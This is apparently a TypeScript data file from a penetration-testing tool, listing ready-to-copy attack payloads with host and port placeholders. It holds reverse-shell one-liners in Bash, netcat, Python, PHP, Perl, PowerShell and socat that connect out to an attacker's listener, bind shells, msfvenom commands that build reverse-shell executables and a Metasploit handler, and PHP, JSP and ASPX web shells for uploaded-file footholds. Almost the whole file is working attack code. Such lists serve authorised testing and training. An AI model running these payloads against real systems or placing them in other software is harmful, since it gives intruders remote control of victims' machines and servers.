import type { WorkstationItem } from "../types";

/**
 * Payloads use {LHOST} and {LPORT} tokens which resolve from the Session Context
 * bar. Set them once and every payload here is ready to copy or fire.
 */

const reverseShell: WorkstationItem = {
  id: "reverse-shell",
  name: "Reverse Shell",
  category: "Payloads",
  summary: "Callback shells in every common language. Start a matching listener in one click.",
  kind: "payload",
  listener: {
    id: "nc-listener",
    label: "Start listener (nc -lvnp)",
    command: "nc -lvnp {LPORT}",
    explain: "Opens a netcat listener in a new tab to catch the shell.",
    newTab: true,
  },
  variants: [
    {
      id: "bash",
      label: "Bash",
      command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
      explain: "Classic Bash TCP reverse shell.",
    },
    {
      id: "bash-read",
      label: "Bash (read line)",
      command: "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
      explain: "Alternative Bash form when the first is filtered.",
    },
    {
      id: "nc",
      label: "netcat (mkfifo)",
      command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
      explain: "Works with netcat builds that lack -e.",
    },
    {
      id: "python3",
      label: "Python 3",
      command:
        "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
      explain: "Spawns a PTY-backed bash over the socket.",
    },
    {
      id: "php",
      label: "PHP",
      command: "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      explain: "Handy when you have PHP code execution.",
    },
    {
      id: "perl",
      label: "Perl",
      command:
        "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    },
    {
      id: "powershell",
      label: "PowerShell",
      command:
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
      explain: "Windows targets.",
    },
    {
      id: "socat",
      label: "socat (full TTY)",
      command:
        "socat TCP:{LHOST}:{LPORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
      explain: "Gives a fully interactive TTY. Pair with the socat listener.",
    },
  ],
};

const bindShell: WorkstationItem = {
  id: "bind-shell",
  name: "Bind Shell",
  category: "Payloads",
  summary: "Listen on the target and connect in from your box.",
  kind: "payload",
  listener: {
    id: "nc-connect",
    label: "Connect to bind shell",
    command: "nc {RHOST} {LPORT}",
    explain: "Connect from your machine to the target's listener.",
    newTab: true,
  },
  variants: [
    {
      id: "nc",
      label: "netcat",
      command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc -lvp {LPORT} >/tmp/f",
    },
    {
      id: "python3",
      label: "Python 3",
      command:
        "python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
    },
  ],
};

const msfvenom: WorkstationItem = {
  id: "msfvenom",
  name: "MSFVenom",
  category: "Payloads",
  summary: "Generate standalone payload files for common platforms.",
  kind: "payload",
  listener: {
    id: "handler",
    label: "Start multi/handler",
    command:
      "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run'",
    explain: "Starts a Metasploit handler for the generated payload.",
    newTab: true,
  },
  variants: [
    {
      id: "linux-elf",
      label: "Linux ELF",
      command:
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
    },
    {
      id: "windows-exe",
      label: "Windows EXE",
      command:
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
    },
    {
      id: "php",
      label: "PHP",
      command: "msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
    },
    {
      id: "war",
      label: "Java WAR",
      command:
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
    },
  ],
};

const webshell: WorkstationItem = {
  id: "web-shell",
  name: "Web Shells",
  category: "Payloads",
  summary: "Drop-in web shells for file-upload footholds.",
  kind: "snippets",
  snippets: [
    {
      id: "php-cmd",
      label: "PHP one-liner",
      command: "<?php system($_GET['cmd']); ?>",
      explain: "Call as ?cmd=id after upload.",
    },
    {
      id: "php-b64",
      label: "PHP (base64 eval)",
      command: "<?php eval(base64_decode($_REQUEST['c'])); ?>",
    },
    {
      id: "jsp",
      label: "JSP",
      command:
        "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    },
    {
      id: "asp",
      label: "ASPX",
      command:
        "<% eval request(\"cmd\") %>",
    },
  ],
};

export const PAYLOADS: WorkstationItem[] = [reverseShell, bindShell, msfvenom, webshell];
